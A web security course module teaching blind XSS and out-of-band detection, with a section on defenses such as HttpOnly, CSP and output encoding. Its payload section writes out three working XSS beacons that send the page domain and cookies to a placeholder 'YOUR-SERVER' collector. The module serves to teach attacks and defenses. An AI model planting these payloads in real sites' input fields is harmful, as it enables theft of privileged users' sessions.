Module 11 · delivery class

Blind XSS & Out-of-Band Techniques attack

The payload fires somewhere you cannot watch — an admin panel, a log dashboard, a support-ticket viewer, a PDF/report generator. You cannot see the alert, so you make the payload phone home.

What makes XSS "blind"

In reflected/stored XSS you observe execution directly. In blind XSS the vulnerable render happens in a context you have no access to:

  • An admin reviewing user feedback / support tickets.
  • A log viewer that renders your User-Agent or Referer.
  • A back-office tool, CRM, or moderation queue.
  • A PDF/report generator that renders HTML server-side (often with an old, script-enabled engine).

Because you can't see the alert, you need out-of-band (OOB) detection: the payload makes a request back to a server you control, proving "it ran, here, in this context." The request itself carries loot (the origin, non-HttpOnly cookies, the DOM).

The canonical blind payload

<script>new Image().src='https://YOUR-SERVER/collect?d='+
    encodeURIComponent(document.domain+'|'+document.cookie)</script>

<!-- no-script variants (mechanism 2), for filtered contexts: -->
<img src=x onerror="this.src='https://YOUR-SERVER/collect?d='+document.domain">
<svg onload="fetch('https://YOUR-SERVER/collect?d='+document.domain)">

A real engagement points at an external collector you own (e.g. an interactsh / Burp Collaborator style host, or your own VPS). In this lab the collector is local — /collect — so nothing ever leaves your machine.

Why the beacon is an <img>/fetch

An image or fetch GET is the smallest reliable exfil channel: it needs no response handling and often survives contexts where other requests are blocked. Note the interplay with defenses:

DefenseEffect on the beacon
HttpOnly cookiesThe payload can still run, but document.cookie is empty — the beacon can't carry the session cookie. Attacker pivots to request forgery (Module 15).
CSP connect-src/img-src/default-srcCan block the outbound beacon to an external host — a real mitigation for exfiltration, though DNS-based OOB may still leak.
No outbound network (air-gapped admin)Forces timing/DOM-stashing techniques; detection gets harder but impact may remain.

Timing-based and stored-detection variants

  • Timing: if you can't beacon, a payload that runs a long loop or delays a response can reveal execution by measuring response time — noisy but sometimes the only channel.
  • DOM stashing: the blind payload writes evidence (document.title, a hidden element, localStorage) that a later, attacker-visible page can read — useful when the admin and public app share an origin.

Why blind XSS is disproportionately dangerous

The victim is almost always privileged (admin, support, moderator), so a single blind hit can mean full compromise. And the payload is often planted in fields nobody thinks of as user input — User-Agent, Referer, a filename, an X-Forwarded header — which is exactly why input you "never display" still needs output encoding wherever it is eventually rendered. This is the strongest argument for defenses that do not depend on remembering every render site: CSP + Trusted Types + contextual auto-encoding by default.

The defense, precisely

  1. Encode at output everywhere, including internal/admin tools and log viewers — they are prime blind sinks.
  2. Set HttpOnly so a beacon can't steal the session cookie.
  3. Restrict outbound with CSP (connect-src, img-src, default-src 'self') to break exfiltration.
  4. Render reports/PDFs with script disabled and treat all captured headers as tainted.
